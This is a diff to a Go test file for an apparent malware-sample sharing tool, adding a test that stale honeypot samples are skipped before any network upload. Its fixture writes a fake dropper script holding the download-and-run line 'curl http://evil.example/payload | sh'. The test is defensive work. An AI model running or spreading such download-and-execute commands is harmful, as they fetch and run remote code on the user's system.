@@ -6,7 +6,9 @@ import (
 	"net/http/httptest"
 	"os"
 	"path/filepath"
+	"strings"
 	"sync"
+	"sync/atomic"
 	"testing"
 	"time"
 )
@@ -157,6 +159,61 @@ func TestShareDryRunSkipsNetwork(t *testing.T) {
 	}
 	if !sawDryRun {
 		t.Errorf("candidate never reached the dry-run gate (rejected earlier)")
+	}
+}
+
+func TestShareHardCapsFreshnessBeforeNetwork(t *testing.T) {
+	dir := t.TempDir()
+	p := filepath.Join(dir, "old-dropper.sh")
+	payload := []byte("#!/bin/sh\ncurl http://evil.example/payload | sh\n" +
+		"# padding to clear the minimum sample-size policy gate xxxxxxxxxxxx\n")
+	if err := os.WriteFile(p, payload, 0o600); err != nil {
+		t.Fatal(err)
+	}
+
+	var calls atomic.Int32
+	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		calls.Add(1)
+		t.Error("12-day-old sample reached the network")
+		_, _ = w.Write([]byte(`{"query_status": "inserted"}`))
+	}))
+	defer srv.Close()
+
+	rec := newMemRecorder()
+	var progressReason string
+	uploaded, skipped, err := Share(context.Background(), rec, []Candidate{{
+		SHA256:     "old-sample",
+		LocalPath:  p,
+		SizeBytes:  int64(len(payload)),
+		CreatedAt:  time.Now(),
+		Origin:     "cowrie_download",
+		ObservedAt: time.Now().Add(-12 * 24 * time.Hour),
+	}}, Options{
+		APIKey:        "k",
+		Endpoint:      srv.URL,
+		MaxBytes:      1 << 20,
+		FreshnessDays: 30,
+		RateLimit:     time.Millisecond,
+		OnProgress: func(_ Candidate, _ Classification, result *Result, err error) {
+			if result != nil && result.Status == "skipped" && err != nil {
+				progressReason = err.Error()
+			}
+		},
+	})
+	if err != nil {
+		t.Fatalf("Share: %v", err)
+	}
+	if uploaded != 0 || skipped != 1 {
+		t.Errorf("want (uploaded=0, skipped=1), got (%d,%d)", uploaded, skipped)
+	}
+	if got := calls.Load(); got != 0 {
+		t.Errorf("network calls = %d, want 0", got)
+	}
+	if len(rec.records) != 0 {
+		t.Errorf("stale sample was recorded: %v", rec.records)
+	}
+	if !strings.Contains(progressReason, "10-day") {
+		t.Errorf("progress reason %q should mention hard 10-day policy", progressReason)
 	}
 }
 
